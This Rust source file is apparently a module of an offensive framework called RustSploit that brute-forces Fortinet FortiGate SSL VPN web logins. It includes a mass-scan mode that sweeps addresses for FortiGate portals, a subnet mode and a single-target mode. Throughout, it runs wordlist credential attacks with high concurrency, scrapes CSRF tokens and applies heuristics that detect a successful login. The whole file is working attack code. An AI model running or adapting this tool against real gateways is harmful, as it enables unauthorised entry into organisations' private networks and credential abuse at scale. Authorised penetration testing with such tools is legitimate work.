use crate::modules::creds::utils::{
    generate_combos, is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_output_file, cfg_prompt_port,
    cfg_prompt_yes_no, get_filename_in_current_dir, load_lines, normalize_target, url_encode,
};
use anyhow::{anyhow, Result};
use colored::*;
use once_cell::sync::Lazy;
use regex::Regex;
use reqwest::{redirect::Policy, ClientBuilder};
use std::{io::Write, net::IpAddr, time::Duration};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "Fortinet SSL VPN Brute Force".to_string(),
        description: "Brute-force Fortinet FortiGate SSL VPN web authentication. Tests credentials against the FortiOS login portal with certificate pinning, realm support, and subnet/mass scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

fn display_banner() {
    crate::mprintln!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Fortinet SSL VPN Brute Force Module                     ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   FortiGate Web Login Credential Testing                  ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!(
            "{}",
            format!("[*] Target: {} — Mass Scan Mode", target).yellow()
        );
        return run_mass_scan(
            target,
            MassScanConfig {
                protocol_name: "FortiGate",
                default_port: 443,
                state_file: "fortinet_hose_state.log",
                default_output: "fortinet_mass_results.txt",
                default_concurrency: 200,
            },
            move |ip, port| async move {
                let url = format!("https://{}:{}/remote/logincheck", ip, port);
                let client =
                    crate::utils::build_http_client(std::time::Duration::from_secs(5)).ok()?;
                let resp = client.get(&url).send().await.ok()?;
                if resp.status().is_success() || resp.status().as_u16() == 401 {
                    let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                    Some(format!(
                        "[{}] {}:{} FortiGate login page found\n",
                        ts, ip, port
                    ))
                } else {
                    None
                }
            },
        )
        .await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        let port: u16 = cfg_prompt_port("port", "Fortinet VPN Port", 443).await?;

        let usernames_file =
            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file =
            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() {
            return Err(anyhow!("Username wordlist is empty"));
        }
        if passes.is_empty() {
            return Err(anyhow!("Password wordlist is empty"));
        }

        let concurrency: usize = {
            let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
            input.parse::<usize>().unwrap_or(10).max(1).min(256)
        };
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file(
            "output_file",
            "Output result file",
            "fortinet_subnet_results.txt",
        )
        .await?;

        let timeout_secs: u64 = {
            let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "10").await?;
            input.parse::<u64>().unwrap_or(10).max(1).min(300)
        };
        let timeout_duration = Duration::from_secs(timeout_secs);

        let realm_str = cfg_prompt_default("realm", "Authentication realm (optional)", "").await?;
        let realm: Option<String> = if realm_str.is_empty() {
            None
        } else {
            Some(realm_str)
        };

        let trusted_cert_str = cfg_prompt_default(
            "trusted_cert",
            "Trusted certificate SHA256 (optional, press Enter to skip)",
            "",
        )
        .await?;
        let trusted_cert: Option<String> = if trusted_cert_str.is_empty() {
            None
        } else {
            Some(trusted_cert_str)
        };

        return run_subnet_bruteforce(
            target,
            port,
            users,
            passes,
            &SubnetScanConfig {
                concurrency,
                verbose,
                output_file,
                service_name: "fortinet-vpn",
                source_module: "creds/generic/fortinet_bruteforce",
                skip_tcp_check: false,
            },
            move |ip: IpAddr, port: u16, user: String, pass: String| {
                let realm = realm.clone();
                let trusted_cert = trusted_cert.clone();
                let timeout_dur = timeout_duration;
                async move {
                    let base_url = format!("https://{}:{}", ip, port);
                    match try_fortinet_login(
                        &base_url,
                        &user,
                        &pass,
                        &realm,
                        &trusted_cert,
                        timeout_dur,
                    )
                    .await
                    {
                        Ok(true) => LoginResult::Success,
                        Ok(false) => LoginResult::AuthFailed,
                        Err(e) => LoginResult::Error {
                            message: e.to_string(),
                            retryable: true,
                        },
                    }
                }
            },
        )
        .await;
    }

    // --- Single Target Mode ---

    // Port
    let port: u16 = cfg_prompt_port("port", "Fortinet VPN Port", 443).await?;

    // Protocol-specific: realm and trusted certificate
    let realm_str = cfg_prompt_default("realm", "Authentication realm (optional)", "").await?;
    let realm: Option<String> = if realm_str.is_empty() {
        None
    } else {
        Some(realm_str)
    };

    let trusted_cert_str = cfg_prompt_default(
        "trusted_cert",
        "Trusted certificate SHA256 (optional, press Enter to skip)",
        "",
    )
    .await?;
    let trusted_cert: Option<String> = if trusted_cert_str.is_empty() {
        None
    } else {
        Some(trusted_cert_str)
    };

    // Wordlists
    let usernames_file =
        cfg_prompt_existing_file("username_wordlist", "Username wordlist path").await?;
    let passwords_file =
        cfg_prompt_existing_file("password_wordlist", "Password wordlist path").await?;

    // Concurrency and timeout
    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10").await?;
        input.parse::<usize>().unwrap_or(10).max(1).min(256)
    };

    let connection_timeout: u64 = {
        let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "10").await?;
        input.parse::<u64>().unwrap_or(10).max(1).min(300)
    };

    // Stop on first success
    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;

    // Save results and output file
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(
            cfg_prompt_output_file("output_file", "Output file name", "fortinet_results.txt")
                .await?,
        )
    } else {
        None
    };

    // Verbose
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;

    // Combo mode
    let combo_mode = cfg_prompt_yes_no(
        "combo_mode",
        "Combination mode? (try every password with every user)",
        false,
    )
    .await?;

    // Load wordlists
    let users = load_lines(&usernames_file)?;
    if users.is_empty() {
        return Err(anyhow!("Username wordlist is empty"));
    }
    crate::mprintln!(
        "{}",
        format!("[*] Loaded {} usernames", users.len()).green()
    );

    let passwords = load_lines(&passwords_file)?;
    if passwords.is_empty() {
        return Err(anyhow!("Password wordlist is empty"));
    }
    crate::mprintln!(
        "{}",
        format!("[*] Loaded {} passwords", passwords.len()).green()
    );

    let combos = generate_combos(&users, &passwords, combo_mode);
    let timeout_duration = Duration::from_secs(connection_timeout);

    let normalized = normalize_target(target)?;
    let target_host = normalized.clone();

    crate::mprintln!(
        "\n{}",
        format!("[*] Starting brute-force on {}:{}", target_host, port).cyan()
    );

    // Build the try_login closure that captures Fortinet-specific state
    let try_login = move |t: String, p: u16, user: String, pass: String| {
        let realm = realm.clone();
        let trusted_cert = trusted_cert.clone();
        let timeout_dur = timeout_duration;
        async move {
            let base_url =
                build_fortinet_url(&t, p).unwrap_or_else(|_| format!("https://{}:{}", t, p));
            match try_fortinet_login(&base_url, &user, &pass, &realm, &trusted_cert, timeout_dur)
                .await
            {
                Ok(true) => LoginResult::Success,
                Ok(false) => LoginResult::AuthFailed,
                Err(e) => LoginResult::Error {
                    message: e.to_string(),
                    retryable: true,
                },
            }
        }
    };

    let result = run_bruteforce(
        &BruteforceConfig {
            target: target_host,
            port,
            concurrency,
            stop_on_success,
            verbose,
            delay_ms: 100,
            max_retries: 2,
            service_name: "fortinet-vpn",
            source_module: "creds/generic/fortinet_bruteforce",
        },
        combos,
        try_login,
    )
    .await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored Fortinet responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no(
            "save_unknown_responses",
            "Save unknown responses to file?",
            true,
        )
        .await?
        {
            let default_name = "fortinet_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            )
            .await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# Fortinet Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

async fn try_fortinet_login(
    base_url: &str,
    username: &str,
    password: &str,
    realm: &Option<String>,
    trusted_cert: &Option<String>,
    timeout_duration: Duration,
) -> Result<bool> {
    let mut client_builder = ClientBuilder::new()
        .cookie_store(true)
        .redirect(Policy::none())
        .timeout(timeout_duration);

    if trusted_cert.is_some() {
        client_builder = client_builder
            .danger_accept_invalid_certs(false)
            .danger_accept_invalid_hostnames(false);
    } else {
        client_builder = client_builder
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true);
    }

    let client = client_builder
        .build()
        .map_err(|e| anyhow!("Failed to create HTTP client: {}", e))?;

    // Get login page
    let login_page_url = format!("{}/remote/login", base_url);

    let login_page_response =
        match tokio::time::timeout(timeout_duration, client.get(&login_page_url).send()).await {
            Ok(Ok(resp)) => resp,
            Ok(Err(e)) => return Err(anyhow!("Failed to get login page: {}", e)),
            Err(_) => return Err(anyhow!("Timeout getting login page")),
        };

    let login_page_body =
        match tokio::time::timeout(timeout_duration, login_page_response.text()).await {
            Ok(Ok(body)) => body,
            Ok(Err(e)) => return Err(anyhow!("Failed to read login page: {}", e)),
            Err(_) => return Err(anyhow!("Timeout reading login page")),
        };

    let csrf_token = extract_csrf_token(&login_page_body);

    // Prepare login form data
    let mut form_data = std::collections::HashMap::new();
    form_data.insert("username", username.to_string());
    form_data.insert("password", password.to_string());
    form_data.insert("ajax", "1".to_string());

    if let Some(r) = realm {
        if !r.is_empty() {
            form_data.insert("realm", r.clone());
        }
    }

    if let Some(token) = csrf_token {
        form_data.insert("magic", token.clone());
    }

    // Send login request
    let login_url = format!("{}/remote/logincheck", base_url);

    // Build form body
    let mut form_pairs: Vec<String> = Vec::new();
    for (key, val) in &form_data {
        form_pairs.push(format!("{}={}", key, url_encode(val)));
    }
    let body = form_pairs.join("&");

    let login_response = match tokio::time::timeout(
        timeout_duration,
        client
            .post(&login_url)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(body)
            .header(
                "User-Agent",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            )
            .header("Referer", &login_page_url)
            .send(),
    )
    .await
    {
        Ok(Ok(resp)) => resp,
        Ok(Err(e)) => return Err(anyhow!("Login request failed: {}", e)),
        Err(_) => return Err(anyhow!("Timeout during login request")),
    };

    let status = login_response.status();

    let location_header = login_response
        .headers()
        .get("Location")
        .and_then(|h| h.to_str().ok())
        .map(|s| s.to_string());

    let cookies: Vec<String> = login_response
        .cookies()
        .map(|c| c.name().to_string())
        .collect();

    let has_auth_cookie = cookies.iter().any(|name| {
        let lower = name.to_lowercase();
        lower.contains("session") || lower.contains("svpn") || lower.contains("fortinet")
    });

    let response_body = match tokio::time::timeout(timeout_duration, login_response.text()).await {
        Ok(Ok(body)) => body,
        Ok(Err(e)) => return Err(anyhow!("Failed to read login response: {}", e)),
        Err(_) => return Err(anyhow!("Timeout reading login response")),
    };

    // Check for explicit success indicators (case-insensitive)
    let body_lower = response_body.to_lowercase();
    let success_indicators = ["redir", "\"1\"", "success", "/remote/index", "portal"];
    if success_indicators
        .iter()
        .any(|&indicator| body_lower.contains(indicator))
    {
        return Ok(true);
    }

    // Check for explicit failure indicators
    let failure_indicators = ["error", "invalid", "failed", "incorrect", "\"0\""];
    if failure_indicators
        .iter()
        .any(|&indicator| response_body.contains(indicator))
    {
        return Ok(false);
    }

    // Check status code and authentication cookies
    if status.is_success() && has_auth_cookie {
        return Ok(true);
    }

    // Check redirect location for success
    if status.as_u16() == 302 {
        if let Some(loc_str) = location_header {
            let success_redirects = ["/remote/index", "portal", "index"];
            if success_redirects.iter().any(|&path| loc_str.contains(path)) {
                return Ok(true);
            }
        }
    }

    Ok(false)
}

/// Extracts CSRF token from HTML response using pre-compiled regex patterns
fn extract_csrf_token(html: &str) -> Option<String> {
    static CSRF_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
        let patterns = [
            r#"name="magic"\s+value="([^"]+)""#,
            r#"name\s*=\s*"magic"\s+value\s*=\s*"([^"]+)""#,
            r#"name="csrf_token"\s+value="([^"]+)""#,
            r#"var\s+magic\s*=\s*"([^"]+)""#,
            r#""magic"\s*:\s*"([^"]+)""#,
            r#"magic=([^&\s"]+)"#,
        ];
        patterns
            .into_iter()
            .filter_map(|p| Regex::new(p).ok())
            .collect()
    });

    for pattern in CSRF_PATTERNS.iter() {
        if let Some(captures) = pattern.captures(html) {
            if let Some(token) = captures.get(1) {
                return Some(token.as_str().to_string());
            }
        }
    }

    None
}

/// Builds Fortinet VPN URL with proper IPv6 handling
fn build_fortinet_url(target: &str, port: u16) -> Result<String> {
    let normalized_host = normalize_target(target)?;

    // Check if port is already present
    let has_port = if normalized_host.starts_with('[') {
        // IPv6 case: check if there's a colon after the closing bracket
        if let Some(bracket_pos) = normalized_host.rfind(']') {
            normalized_host[bracket_pos..].contains(':')
        } else {
            false
        }
    } else {
        normalized_host.contains(':')
    };

    let url = if has_port {
        format!("https://{}", normalized_host)
    } else {
        format!("https://{}:{}", normalized_host, port)
    };

    Ok(url)
}
